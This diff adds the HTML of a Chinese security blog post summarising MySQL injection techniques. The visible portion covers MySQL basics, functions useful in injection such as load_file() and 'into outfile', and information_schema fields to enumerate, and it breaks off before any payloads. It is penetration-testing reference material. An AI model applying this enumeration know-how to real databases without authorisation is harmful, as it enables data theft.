@@ -1,0 +1,1431 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000">
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top">
+  
+  
+  <title>MYSQL注入总结 | VK&#39;Blog|博客</title>
+  <meta name="description" content="0x01 Mysql简介 Mysql数据库结构   0x02 MySQL注入常用函数 常用函数 MySQL运算符   0x03 注入常用表、目标字段 可查字段   0x04 Mysql相关 0x05 Mysql注入 联合查询注入 无回显 盲注 bool盲注 时间盲注   报错注入 Xpath语法错误-updatexml() Xpath语法错误-extractvalue() floor()报错">
+<meta name="keywords" content="WEB渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MYSQL注入总结">
+<meta property="og:url" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/index.html">
+<meta property="og:site_name" content="VK&#39;s blog">
+<meta property="og:description" content="0x01 Mysql简介 Mysql数据库结构   0x02 MySQL注入常用函数 常用函数 MySQL运算符   0x03 注入常用表、目标字段 可查字段   0x04 Mysql相关 0x05 Mysql注入 联合查询注入 无回显 盲注 bool盲注 时间盲注   报错注入 Xpath语法错误-updatexml() Xpath语法错误-extractvalue() floor()报错">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15833938113421.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15833987855105.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15834227787798.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15834815952180.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837622996586.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837676684897.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837692093873.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837698120684.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837698674252.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837698890518.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837699078194.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837699241059.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837699499581.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15837702846548.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15838167660722.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15838173462542.jpg">
+<meta property="og:updated_time" content="2020-03-11T03:08:54.062Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MYSQL注入总结">
+<meta name="twitter:description" content="0x01 Mysql简介 Mysql数据库结构   0x02 MySQL注入常用函数 常用函数 MySQL运算符   0x03 注入常用表、目标字段 可查字段   0x04 Mysql相关 0x05 Mysql注入 联合查询注入 无回显 盲注 bool盲注 时间盲注   报错注入 Xpath语法错误-updatexml() Xpath语法错误-extractvalue() floor()报错">
+<meta name="twitter:image" content="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/15833938113421.jpg">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/index.html">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+  
+</head>
+
+
+<body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">VK</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">VK&#39;Blog</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="http://www.vkxss.top" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APP/">APP</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2016/">CVE-2016</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2017/">CVE-2017</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2018/">CVE-2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2019/">CVE-2019</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA/">JAVA</a><span class="category-list-count">20</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB安全/">WEB安全</a><span class="category-list-count">17</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端安全/">前端安全</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/应急响应/">应急响应</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/APP渗透测试/">APP渗透测试</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2016–3714/">CVE-2016–3714</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2017-11882/">CVE-2017-11882</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2018-1273/">CVE-2018-1273</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-0708/">CVE-2019-0708</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-16278/">CVE-2019-16278</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-16759/">CVE-2019-16759</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java代码审计/">Java代码审计</a><span class="tag-list-count">20</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux本地提取/">Linux本地提取</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB渗透测试/">WEB渗透测试</a><span class="tag-list-count">19</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全-CSRF/">前端安全-CSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端知识/">前端知识</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/加解密集合/">加解密集合</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反弹Shell/">反弹Shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/应急响应/">应急响应</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/APP渗透测试/" style="font-size: 13.6px;">APP渗透测试</a> <a href="/tags/CVE-2016–3714/" style="font-size: 13px;">CVE-2016–3714</a> <a href="/tags/CVE-2017-11882/" style="font-size: 13px;">CVE-2017-11882</a> <a href="/tags/CVE-2018-1273/" style="font-size: 13px;">CVE-2018-1273</a> <a href="/tags/CVE-2019-0708/" style="font-size: 13px;">CVE-2019-0708</a> <a href="/tags/CVE-2019-16278/" style="font-size: 13px;">CVE-2019-16278</a> <a href="/tags/CVE-2019-16759/" style="font-size: 13.2px;">CVE-2019-16759</a> <a href="/tags/Java代码审计/" style="font-size: 14px;">Java代码审计</a> <a href="/tags/Linux本地提取/" style="font-size: 13px;">Linux本地提取</a> <a href="/tags/WEB渗透测试/" style="font-size: 13.8px;">WEB渗透测试</a> <a href="/tags/前端安全-CSRF/" style="font-size: 13px;">前端安全-CSRF</a> <a href="/tags/前端知识/" style="font-size: 13.4px;">前端知识</a> <a href="/tags/加解密集合/" style="font-size: 13px;">加解密集合</a> <a href="/tags/反弹Shell/" style="font-size: 13px;">反弹Shell</a> <a href="/tags/应急响应/" style="font-size: 13px;">应急响应</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/APP/">APP</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/03/05/APP-Android脱壳的dex文件回编译APK/" class="title">APP-Android脱壳的dex文件回编译APK</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-03-05T07:20:20.000Z" itemprop="datePublished">2020-03-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/APP/">APP</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/02/28/APP-Android脱壳-FRIDA-DEXDump/" class="title">APP-Android脱壳-FRIDA-DEXDump</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-02-28T07:18:29.000Z" itemprop="datePublished">2020-02-28</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/APP/">APP</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/02/10/APP-Android抓包技巧/" class="title">APP-Android抓包技巧</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-02-10T07:30:08.000Z" itemprop="datePublished">2020-02-10</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/APP/">APP</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/02/08/APP-APK签名技巧记录/" class="title">APK签名技巧记录</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-02-08T07:30:08.000Z" itemprop="datePublished">2020-02-08</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/JAVA/">JAVA</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/02/05/代码审计-Java-CORS/" class="title">Java代码审计-CORS</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-02-05T06:15:29.558Z" itemprop="datePublished">2020-02-05</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-渗透测试-MYSQL注入总结" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MYSQL注入总结
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/01/05/渗透测试-MYSQL注入总结/" class="article-date">
+	  <time datetime="2020-01-05T07:30:08.000Z" itemprop="datePublished">2020-01-05</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/WEB安全/">WEB安全</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/WEB渗透测试/">WEB渗透测试</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/01/05/渗透测试-MYSQL注入总结/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 5.1k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 20(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <!-- toc -->
+
+<ul>
+<li><a href="#0x01-mysql简介">0x01 Mysql简介</a><ul>
+<li><a href="#mysql数据库结构">Mysql数据库结构</a></li>
+</ul>
+</li>
+<li><a href="#0x02-mysql注入常用函数">0x02 MySQL注入常用函数</a><ul>
+<li><a href="#常用函数">常用函数</a></li>
+<li><a href="#mysql运算符">MySQL运算符</a></li>
+</ul>
+</li>
+<li><a href="#0x03-注入常用表-目标字段">0x03 注入常用表、目标字段</a><ul>
+<li><a href="#可查字段">可查字段</a></li>
+</ul>
+</li>
+<li><a href="#0x04-mysql相关">0x04 Mysql相关</a></li>
+<li><a href="#0x05-mysql注入">0x05 Mysql注入</a><ul>
+<li><a href="#联合查询注入">联合查询注入</a></li>
+<li><a href="#无回显">无回显</a></li>
+<li><a href="#盲注">盲注</a><ul>
+<li><a href="#bool盲注">bool盲注</a></li>
+<li><a href="#时间盲注">时间盲注</a></li>
+</ul>
+</li>
+<li><a href="#报错注入">报错注入</a><ul>
+<li><a href="#xpath语法错误-updatexml">Xpath语法错误-updatexml()</a></li>
+<li><a href="#xpath语法错误-extractvalue">Xpath语法错误-extractvalue()</a></li>
+<li><a href="#floor报错注入">floor()报错注入</a></li>
+<li><a href="#exp报错注入">exp()报错注入</a></li>
+<li><a href="#bigint数值操作">Bigint数值操作</a></li>
+<li><a href="#不存在的函数">不存在的函数</a></li>
+<li><a href="#列名重复-name_const">列名重复-name_const()</a></li>
+<li><a href="#join-using注列名">join using()注列名</a></li>
+<li><a href="#gtid相关函数">GTID相关函数</a></li>
+</ul>
+</li>
+<li><a href="#二次注入">二次注入</a><ul>
+<li><a href="#涉及函数">涉及函数</a></li>
+<li><a href="#漏洞原理">漏洞原理</a></li>
+<li><a href="#题目实战">题目实战</a></li>
+</ul>
+</li>
+<li><a href="#堆叠注入">堆叠注入</a><ul>
+<li><a href="#涉及字符">涉及字符</a></li>
+<li><a href="#原理分析">原理分析</a></li>
+</ul>
+</li>
+<li><a href="#宽字节注入">宽字节注入</a><ul>
+<li><a href="#涉及函数-1">涉及函数</a></li>
+<li><a href="#漏洞原因">漏洞原因</a></li>
+</ul>
+</li>
+<li><a href="#异或注入">异或注入</a><ul>
+<li><a href="#涉及符号">涉及符号</a></li>
+<li><a href="#原理分析-1">原理分析</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="0x01-mysql简介">0x01 Mysql简介</span></h2><ul>
+<li><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p>
+<ul>
+<li>MySQL是开源的，所以你不需要支付额外的费用。</li>
+<li>MySQL使用标准的 SQL 数据语言形式。</li>
+<li>MySQL可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li>
+<li>MySQL对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。</li>
+<li>MySQL支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li>
+<li>MySQL是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。</li>
+</ul>
+</li>
+<li><p>那么就有人问了，什么是关系型数据库？所谓关系型数据库，就是是依据关系模型来创建的数据库。所谓关系模型是我们生活中能经常遇见的模型，存储这类数据一般用关系型数据库。比如一个老师对应多个学生的数据（“多对多”），一本书对应多个作者（“一对多”），一本书对应一个出版日期（“一对一”）。</p>
+<ul>
+<li>常见的关系型数据库：<ul>
+<li>Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access、MySQL</li>
+</ul>
+</li>
+<li>关系型数据库的特点：<ul>
+<li>安全（因为存储在磁盘中，不会说突然断电数据就没有了）、容易理解（建立在关系模型上）、但不节省空间（因为建立在关系模型上，就要遵循某些规则，好比数据中某字段值即使为空仍要分配空间）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>反之就有非关系型数据库，非关系型数据库主要是基于“非关系模型”的数据库（由于关系型太大，所以一般用“非关系型”来表示其他类型的数据库），</p>
+<ul>
+<li><p>非关系型模型比如有：</p>
+<ul>
+<li><p>列模型：存储的数据是一列列的。关系型数据库以一行作为一个记录，列模型数据库以一列为一个记录。（这种模型，数据即索引，IO很快，主要是一些分布式数据库）</p>
+</li>
+<li><p>键值对模型：存储的数据是一个个“键值对”，比如name:liming,那么name这个键里面存的值就是liming</p>
+</li>
+<li><p>文档类模型：以一个个文档来存储数据，有点类似“键值对”</p>
+</li>
+</ul>
+</li>
+<li><p>常见非关系模型数据库：</p>
+<ul>
+<li>列模型：Hbase</li>
+<li>键值对模型：redis,MemcacheDB</li>
+<li>文档类模型：mongoDB</li>
+</ul>
+</li>
+<li><p>非关系型数据库的特点：</p>
+<ul>
+<li>效率高（因为存储在内存中）、但不安全（断电丢失数据，但其中redis可以同步数据到磁盘中），现在很多非关系型数据库都开始支持转存到磁盘中。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3><span id="mysql数据库结构">Mysql数据库结构</span></h3><table>
+<thead>
+<tr>
+<th>库名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mysql</td>
+<td>保存有账户信息、权限信息、存储过程等</td>
+</tr>
+<tr>
+<td>sys</td>
+<td>包含了一系列的存储过程、自定义函数等</td>
+</tr>
+<tr>
+<td>information_schema</td>
+<td>保存着MySQL服务器所维护的所有其他数据库信息。如数据库名，数据库表等</td>
+</tr>
+<tr>
+<td>performance_schema</td>
+<td>收集数据库服务器性能参数</td>
+</tr>
+</tbody></table>
+<ul>
+<li>这些MySQL内置的数据库对注入帮助巨大。</li>
+</ul>
+<h2><span id="0x02-mysql注入常用函数">0x02 MySQL注入常用函数</span></h2><h3><span id="常用函数">常用函数</span></h3><table>
+<thead>
+<tr>
+<th>函数名称</th>
+<th>函数功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mysql</td>
+<td>保存有账户信息、权限信息、存储过程等</td>
+</tr>
+<tr>
+<td>system_user()</td>
+<td>系统用户名</td>
+</tr>
+<tr>
+<td>user()</td>
+<td>用户名</td>
+</tr>
+<tr>
+<td>current_user()</td>
+<td>当前用户名</td>
+</tr>
+<tr>
+<td>session_user()</td>
+<td>连接数据库的用户名</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>数据库名</td>
+</tr>
+<tr>
+<td>version()</td>
+<td>数据库版本</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库路径</td>
+</tr>
+<tr>
+<td>@@basedir</td>
+<td>数据库安装路径</td>
+</tr>
+<tr>
+<td>@@version_complie_os</td>
+<td>操作系统</td>
+</tr>
+<tr>
+<td>count()</td>
+<td>返回执行结果的数量</td>
+</tr>
+<tr>
+<td>concat()</td>
+<td>没有分割地连接字符串</td>
+</tr>
+<tr>
+<td>concat_ws()</td>
+<td>含有分隔符地连接字符串</td>
+</tr>
+<tr>
+<td>group_concat()</td>
+<td>连接一个组的所有字符串，并以逗号分隔每一条数据</td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>读取本地文件</td>
+</tr>
+<tr>
+<td>into outfile</td>
+<td>写文件</td>
+</tr>
+<tr>
+<td>ascii()</td>
+<td>字符串的ASCII代码值</td>
+</tr>
+<tr>
+<td>ord()</td>
+<td>函数返回字符串第一个字符的 ASCII 值</td>
+</tr>
+<tr>
+<td>mid()</td>
+<td>返回字符串的一部分</td>
+</tr>
+<tr>
+<td>substr()</td>
+<td>返回字符串的一部分</td>
+</tr>
+<tr>
+<td>length()</td>
+<td>返回字符串的长度</td>
+</tr>
+<tr>
+<td>left()</td>
+<td>返回字符串最左面的几个字符</td>
+</tr>
+<tr>
+<td>floor()</td>
+<td>返回小于等于x的最大整数</td>
+</tr>
+<tr>
+<td>rand()</td>
+<td>返回0至1之间的一个随机数</td>
+</tr>
+<tr>
+<td>extractvalue()</td>
+<td>第一个参数：XML文档对象名称；第二个参数：Xpath格式的字符串。 作用：从目标XML中返回包含所查询值的字符串</td>
+</tr>
+<tr>
+<td>updatexml()</td>
+<td>第一个参数：XML文档对象名称；第二个参数：Xpath格式字符串；第三个参数：string格式。作用：改变符合条件的节点的值</td>
+</tr>
+<tr>
+<td>sleep()</td>
+<td>让此语句运行N秒钟</td>
+</tr>
+<tr>
+<td>if()</td>
+<td>select if(1&gt;2,2,3) 返回 3</td>
+</tr>
+<tr>
+<td>char()</td>
+<td>返回整数所对应的ASCII码字符组成的字符串</td>
+</tr>
+<tr>
+<td>exp()</td>
+<td>返回e的n次方</td>
+</tr>
+</tbody></table>
+<h3><span id="mysql运算符">MySQL运算符</span></h3><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IS NULL</td>
+<td>为空</td>
+</tr>
+<tr>
+<td>IS NOT NULL</td>
+<td>不为空</td>
+</tr>
+<tr>
+<td>BETWEEN AND</td>
+<td>在···之间</td>
+</tr>
+<tr>
+<td>IN</td>
+<td>包含</td>
+</tr>
+<tr>
+<td>NOT IN</td>
+<td>不包含</td>
+</tr>
+<tr>
+<td>LIKE</td>
+<td>模式匹配</td>
+</tr>
+<tr>
+<td>NOT LIKE</td>
+<td>模式匹配</td>
+</tr>
+<tr>
+<td>REGEXP</td>
+<td>正则表达式</td>
+</tr>
+</tbody></table>
+<h2><span id="0x03-注入常用表-目标字段">0x03 注入常用表、目标字段</span></h2><h3><span id="可查字段">可查字段</span></h3><ul>
+<li><p>schema</p>
+<ul>
+<li>information_schema.COLUMNS -&gt; TABLE_SCHEMA</li>
+<li>information_schema.KEY_COLUMN_USAGE -&gt; CONSTRAINT_SCHEMA, TABLE_SCHEMA, REFERENCED_TABLE_SCHEMA</li>
+<li>information_schema.PARTITIONS -&gt; TABLE_SCHEMA</li>
+<li>information_schema.SCHEMATA -&gt; SCHEMA_NAME</li>
+<li>information_schema.STATISTICS -&gt; TABLE_SCHEMA</li>
